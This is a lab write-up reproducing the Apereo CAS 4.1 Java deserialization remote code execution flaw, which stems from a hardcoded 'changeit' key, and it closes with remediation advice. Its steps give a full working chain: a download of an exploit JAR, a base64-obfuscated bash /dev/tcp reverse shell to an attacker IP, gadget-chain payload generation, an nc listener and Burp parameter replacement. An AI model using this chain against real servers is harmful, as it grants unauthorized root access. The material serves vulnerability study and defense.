# Apereo CAS 4.1 Java Deserialization Remote Code Execution

> [中文文档](README.md)

| Property | Details |
|----------|---------|
| Vulnerability ID | CAS-4.1-RCE |
| Affected Versions | Apereo CAS < 4.1.7 |
| Vulnerability Type | Java Deserialization + Remote Code Execution (RCE) |
| Severity | 🔴 Critical |
| Default Credentials | Any username/password (no valid account required) |
| Prerequisites | Network access to the CAS login page (default port 8080) |

Apereo CAS is a Central Authentication Service platform published by Apereo, widely used for enterprise Single Sign-On (SSO) systems. In versions prior to 4.1.7, the CAS Webflow component uses an `EncryptedTranscoder` class to handle encrypted state transmission. This class is initialized with a hardcoded default key `changeit` and the `AES/CBC/PKCS7` cipher algorithm.

Because the `execution` parameter in the CAS login flow is decrypted and Java-deserialized server-side, an attacker can use the same hardcoded key to craft a malicious serialized payload containing a `CommonsCollections` exploit chain. Submitting this payload as the `execution` parameter on the login endpoint triggers deserialization on the target server — with no valid credentials required — and executes arbitrary system commands as `root`.

The barrier to exploitation is extremely low: an attacker only needs to download the publicly available `apereo-cas-attack-1.0-SNAPSHOT-all.jar` tool, intercept a login request with `Burp Suite`, replace the `execution` parameter, and obtain a root reverse shell in a single step.

## Vulnerability Reproduction

### Setup

After starting the target machine, navigate to `http://your-ip:8080/cas/login` to confirm the Apereo CAS login page loads successfully.

![Apereo CAS login page](https://static.nextcyber.cn/attachments/images/course/task/2fdd8c6a9da845c78cbc8e0efefbea6f.png)

**Root cause**: `EncryptedTranscoder` uses a hardcoded default key `changeit`, as shown in the source code below:

```java
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");  // hardcoded default key
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }
    // ...
}
```

### Step 1: Download the Exploit Tool and Generate the Payload

On the attacker machine (Kali), download the `apereo-cas-attack` JAR using `wget`:

```bash
wget https://github.com/vulhub/Apereo-CAS-Attack/releases/download/v1.0.0/apereo-cas-attack-1.0-SNAPSHOT-all.jar
```

> [!NOTE]
> Payload generation requires Java 1.8 (JDK 8). Higher JVM versions will fail to execute the gadget chain. Verify your version with `java -version` before proceeding.

```bash
┌──(root㉿nextcyber)-[~]
└─# java -version
openjdk version "1.8.0_432-432"
OpenJDK Runtime Environment (build 1.8.0_432-432-b06)
OpenJDK 64-Bit Server VM (build 25.432-b06, mixed mode)
```

Base64-encode the reverse shell command (replace the IP with your attacker machine's address):

```bash
# Original command
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

# Base64-encoded result
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=

# Full payload command
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
```

Generate the encrypted, serialized payload using the `CommonsCollections4` gadget chain:

```bash
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}"
```

The command outputs a URL-encoded encrypted payload string. Copy it for use in the next step.

### Step 2: Intercept the Login Request and Replace the Payload

On the attacker machine, start an `nc` listener on port `1234`:

```bash
nc -lvnp 1234
```

Enable `Burp Suite` proxy interception, then enter any username and password in the browser and click the login button to capture the request. **Replace the entire value** of the `execution` parameter in the request body with the payload generated in the previous step, then forward the request.

![Burp Suite intercepting the login request and replacing the execution parameter](https://static.nextcyber.cn/attachments/images/course/task/6ce7e97669124e4699ce0bdc91bddd64.png)

### Step 3: Receive the Reverse Shell

After a brief delay, the `nc` listener on the attacker machine receives the reverse shell with `root` privileges.

![Exploitation successful — root reverse shell obtained](https://static.nextcyber.cn/attachments/images/course/task/1256b464f617424f85c519a8589b1973.png)

## Remediation

1. **Upgrade to version 4.1.7 or later**: The hardcoded key vulnerability was fixed in 4.1.7. Upgrade Apereo CAS immediately.
2. **Replace the default encryption key**: If an immediate upgrade is not possible, replace the hardcoded `keyPassword` value `changeit` in `EncryptedTranscoder` with a strong random secret, then rebuild and redeploy.
3. **Restrict network access**: Limit access to the CAS service port (8080/443) to trusted internal IP ranges; block all direct public internet access to the login endpoint.
4. **Remove or upgrade vulnerable deserialization libraries**: Remove or upgrade `commons-collections` and other dependencies with known exploit gadget chains to reduce the deserialization attack surface.
5. **Deploy a WAF**: Place a Web Application Firewall in front of the CAS login endpoint to detect and block requests where the `execution` parameter carries anomalous serialized data.


---

## Practice

Practice this vulnerability online at [NextCyber Academy](https://app.nextcyber.cn/courses/46).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
